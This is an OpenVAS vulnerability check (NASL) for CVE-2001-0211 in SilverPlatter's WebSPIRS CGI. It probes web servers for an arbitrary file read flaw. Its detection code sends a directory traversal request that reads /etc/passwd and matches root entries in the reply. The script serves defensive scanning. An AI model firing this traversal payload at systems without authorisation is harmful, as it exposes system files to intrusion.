# OpenVAS Vulnerability Test
# $Id: webspirs_cgi.nasl 17 2013-10-27 14:01:43Z jan $
# Description: webspirs.cgi
#
# Authors:
# Laurent Kitzinger <lkitzinger@yahoo.fr>
#
# Copyright:
# Copyright (C) 2001 Laurent Kitzinger
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote web server contains a CGI script that is prone to
information disclosure. 

Description :

The remote host is running WebSPIRS, SilverPlatter's Information
Retrieval System for the World Wide Web. 

The installed version of WebSPIRS has a well known security flaw that
lets an attacker read arbitrary files with the privileges of the http
daemon (usually root or nobody).";

tag_solution = "Remove this CGI script.";

 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

if(description)
{
 script_id(10616);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(2362);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_tag(name:"risk_factor", value:"Medium");
 script_cve_id("CVE-2001-0211");
 
 name = "webspirs.cgi";

 script_name(name);
 
 script_description(desc);
 
 summary = "Checks for the presence of webspirs.cgi";
 
 script_summary(summary);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright("This script is Copyright (C) 2001 Laurent Kitzinger");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("http_version.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2001-02/0217.html");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 req = http_get(item:string(dir, "/webspirs.cgi?sp.nextform=../../../../../../../../../etc/passwd"),
 		port:port);
 r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if( r == NULL ) exit(0);		
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:r)) {
    if (report_verbosity > 0) {
      report = string(
        desc,
        "\n",
        "Plugin output :\n",
        "\n",
        r
      );
    }
    else report = desc;

    security_warning(port:port, data:report);
 }
}
